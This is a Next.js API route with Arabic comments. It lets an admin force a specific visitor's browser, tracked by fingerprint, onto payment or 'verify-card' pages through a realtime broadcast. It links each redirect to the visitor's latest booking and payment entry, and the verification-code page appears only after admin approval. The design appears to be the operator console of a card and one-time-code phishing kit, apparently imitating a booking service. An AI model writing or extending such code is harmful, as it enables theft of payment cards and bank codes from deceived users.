import { NextRequest, NextResponse } from "next/server";
import { createClient, createServiceClient, broadcastDirectNavigate } from "@/lib/supabase/server";
import { getDirectPage, resolveDirectPath } from "@/lib/direct-pages";

async function requireAdmin() {
  const supabase = createClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();
  if (!user) return null;
  const { data: setting } = await supabase
    .from("settings")
    .select("value")
    .eq("key", "admin_email")
    .maybeSingle();
  const adminEmail = (setting?.value as { email?: string })?.email;
  if (adminEmail && user.email === adminEmail) return user;
  return null;
}

// توجيه العميل إلى صفحة داخل الموقع من لوحة التحكم (عبر Realtime Broadcast).
export async function POST(request: NextRequest) {
  const admin = await requireAdmin();
  if (!admin) return NextResponse.json({ error: "غير مصرح" }, { status: 403 });

  const body = await request.json().catch(() => null);
  if (!body) return NextResponse.json({ error: "بيانات غير صالحة" }, { status: 400 });

  const clientId = String(body.clientId ?? "");
  const pageValue = String(body.page ?? "");
  if (!clientId || !pageValue) {
    return NextResponse.json({ error: "missing_params" }, { status: 400 });
  }
  const page = getDirectPage(pageValue);
  if (!page) {
    return NextResponse.json({ error: "invalid_page" }, { status: 400 });
  }

  const supabase = createServiceClient();

  // نبحث عن بصمة العميل الحقيقية (المخزّنة في قاعدة البيانات) لنبثّ على قناته.
  const { data: c } = await supabase
    .from("clients")
    .select("fingerprint")
    .eq("id", clientId)
    .maybeSingle();
  if (!c?.fingerprint) {
    return NextResponse.json({ error: "client_not_found" }, { status: 404 });
  }

  // للصفحات الديناميكية (الدفع/رمز التحقق) نبحث عن أحدث حجز للعميل، وعن entry
  // من نوع payment مرتبط بذلك الحجز (يوفّر معرّف pid لصفحة رمز التحقق).
  let bookingId: string | null = null;
  let paymentEntryId: string | null = null;
  if (page.dynamic) {
    // 1) أحدث حجز في جدول bookings مباشرةً.
    const { data: latestBooking } = await supabase
      .from("bookings")
      .select("id")
      .eq("client_id", clientId)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();
    bookingId = latestBooking?.id ?? null;

    // 2) إن لم يُعثر عليه، نبحث عن أحدث maawen_booking في client_data_entries
    //    (حجوزات معاون تُخزَّن هناك مع booking_id في الـ payload).
    if (!bookingId) {
      const { data: maawenEntries } = await supabase
        .from("client_data_entries")
        .select("payload")
        .eq("client_id", clientId)
        .eq("type", "maawen_booking")
        .order("created_at", { ascending: false })
        .limit(10);
      for (const me of maawenEntries ?? []) {
        const mp = (me.payload as Record<string, unknown>) ?? {};
        const bid = String(mp.booking_id ?? mp.bookingId ?? "");
        if (bid) {
          bookingId = bid;
          break;
        }
      }
    }

    if (bookingId) {
      const { data: paymentEntries } = await supabase
        .from("client_data_entries")
        .select("id, payload")
        .eq("client_id", clientId)
        .eq("type", "payment")
        .order("created_at", { ascending: false })
        .limit(20);
      // نفضّل entry بحالة approved (رمز التحقق يُعرض فقط بعد موافقة المدير)،
      // وإلا نأخذ أحدث طلب دفع قائم (الدفع/التحقق المبدئي).
      for (const pe of paymentEntries ?? []) {
        const p = (pe.payload as Record<string, unknown>) ?? {};
        if (String(p.booking_id ?? p.bookingId ?? "") !== bookingId) continue;
        const status = String(p.status ?? "");
        if (status === "approved" || !paymentEntryId) {
          paymentEntryId = pe.id;
        }
        if (status === "approved") break;
      }
    }
  }

  let resolvedPath = resolveDirectPath(page, { bookingId, paymentEntryId });
  if (!resolvedPath) {
    // لا يوجد حجز سابق للعميل — الصفحات الديناميكية لا يمكن توجيهه إليها.
    // بدل فشل التوجيه نرسله إلى صفحة بيانات العميل (بداية تدفق معاون)
    // حيث يستطيع إنشاء/إكمال حجز ثم الدفع.
    if (page.value === "payment" || page.value === "verify-card") {
      resolvedPath = "/client-info";
    } else {
      return NextResponse.json(
        { error: "no_booking_for_client", message: "لا يوجد حجز سابق لهذا العميل لتوجيهه إلى هذه الصفحة" },
        { status: 409 },
      );
    }
  }

  const at = new Date().toISOString();

  // سجّل التوجيه كصندوق جديد في الخط الزمني (تدقيق + إمكانية إعادة التوجيه).
  const { data: inserted, error: iErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: clientId,
      type: "direct_navigate",
      payload: {
        page: page.value,
        label: page.label,
        path: resolvedPath,
        status: "sent",
        admin_email: admin.email,
        at,
      },
    })
    .select("id")
    .single();
  if (iErr) {
    return NextResponse.json({ error: "insert_failed" }, { status: 500 });
  }

  // بثّ التوجيه الفوري على قناة خاصة بالبصمة (best-effort).
  await broadcastDirectNavigate({
    fingerprint: c.fingerprint,
    path: resolvedPath,
    label: page.label,
    entryId: inserted.id,
    at,
  });

  return NextResponse.json({ ok: true, path: resolvedPath, at });
}